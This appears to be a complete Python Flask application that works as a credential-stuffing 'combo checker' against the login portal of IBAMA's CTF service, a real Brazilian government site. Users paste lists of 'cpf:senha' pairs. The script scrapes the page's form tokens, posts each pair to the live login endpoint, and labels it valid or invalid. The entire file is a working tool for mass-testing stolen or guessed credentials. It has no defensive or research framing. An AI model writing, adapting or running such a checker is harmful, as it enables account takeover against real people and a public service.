from flask import Flask, render_template, request
import requests
from bs4 import BeautifulSoup

app = Flask(__name__)

def check_login_ibama(cpf, senha):
    session = requests.Session()

    try:
        # 1 - GET para pegar os tokens e cookie
        url_home = "https://servicos.ibama.gov.br/ctf/"
        response = session.get(url_home, timeout=20)

        if response.status_code != 200:
            return "Erro ao acessar a página inicial."

        soup = BeautifulSoup(response.text, 'html.parser')

        # Coletar tokens
        route = soup.find('input', {'name': 'route'})
        formdin = soup.find('input', {'name': 'formdin_instance_id'})

        if not route or not formdin:
            return "Erro ao capturar tokens. O site pode ter mudado."

        route_token = route.get('value')
        formdin_token = formdin.get('value')

        # 2 - POST para tentar logar
        url_post = "https://servicos.ibama.gov.br/ctf/index.php"
        payload = {
            'ajax': '2',
            'aplic': 'ctf',
            'login_cpf': cpf,
            'login_senha': senha,
            'formDinAcao': 'autenticar',
            'dataType': 'json',
            'route': route_token,
            'formdin_instance_id': formdin_token
        }

        headers = {
            'Referer': url_home,
            'User-Agent': 'Mozilla/5.0',
            'X-Requested-With': 'XMLHttpRequest'
        }

        post_response = session.post(url_post, data=payload, headers=headers, timeout=20)

        if "autenticado" in post_response.text.lower():
            return "✅ Login Válido"
        elif "senha" in post_response.text.lower() or "inválido" in post_response.text.lower():
            return "❌ Login Inválido"
        else:
            return "⚠️ Erro ou resposta inesperada"

    except Exception as e:
        return f"⚠️ Erro: {str(e)}"


@app.route('/', methods=['GET', 'POST'])
def index():
    resultado = []
    if request.method == 'POST':
        combos = request.form['combos'].splitlines()
        for combo in combos:
            if ':' in combo:
                cpf, senha = combo.strip().split(':', 1)
                status = check_login_ibama(cpf.strip(), senha.strip())
                resultado.append(f'{cpf.strip()}:{senha.strip()} → {status}')
    return render_template('index.html', resultado=resultado)


if __name__ == '__main__':
    app.run(debug=True)
